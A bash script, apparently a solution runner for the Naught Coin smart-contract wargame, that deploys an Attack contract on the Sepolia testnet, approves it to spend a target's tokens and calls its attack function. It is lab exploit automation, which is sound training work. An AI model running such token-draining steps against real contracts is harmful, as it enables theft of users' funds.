#!/bin/bash

# Navigate up three directories (adjust if necessary)
cd ../..
cd ..

# Load environment variables from .env file
if [ ! -f .env ]; then
    echo ".env file not found!"
    exit 1
fi
source .env

# Prompt for the TARGET value
read -p "Enter the TARGET value: " TARGET

# Check if TARGET is provided
if [ -z "$TARGET" ]; then
    echo "TARGET value is required."
    exit 1
fi

# Deploy the contract using Forge and capture the output
echo "Deploying contract..."
DEPLOY_OUTPUT=$(forge create --rpc-url "$SEPOLIA_RPC_URL" --constructor-args "$TARGET" --private-key "$PRIVATE_KEY" src/Naught_Coin/solution/Attack.sol:Attack)
if [ $? -ne 0 ]; then
    echo "Contract deployment failed!"
    exit 1
fi

# Extract the deployment address from the output
CURRENT=$(echo "$DEPLOY_OUTPUT" | grep "Deployed to" | awk '{print $NF}')
if [ -z "$CURRENT" ]; then
    echo "Failed to extract deployment address."
    exit 1
fi

# Print the deployment address
echo "Contract deployed to address: $CURRENT"

# Approve the Attack contract to spend tokens
echo "Approving tokens for the Attack contract..."
if ! cast send "$TARGET" "approve(address,uint256)" "$CURRENT" "1000000000000000000000000" --private-key "$PRIVATE_KEY" --rpc-url "$SEPOLIA_RPC_URL"; then
    echo "Error sending approval transaction. Check contract function and arguments."
    exit 1
fi

# Interact with the deployed contract
echo "Calling attack function on the deployed contract..."
if ! cast send "$CURRENT" "attack()" --private-key "$PRIVATE_KEY" --rpc-url "$SEPOLIA_RPC_URL"; then
    echo "Error sending attack transaction. Check contract function and arguments."
    exit 1
fi

echo "Script completed successfully."
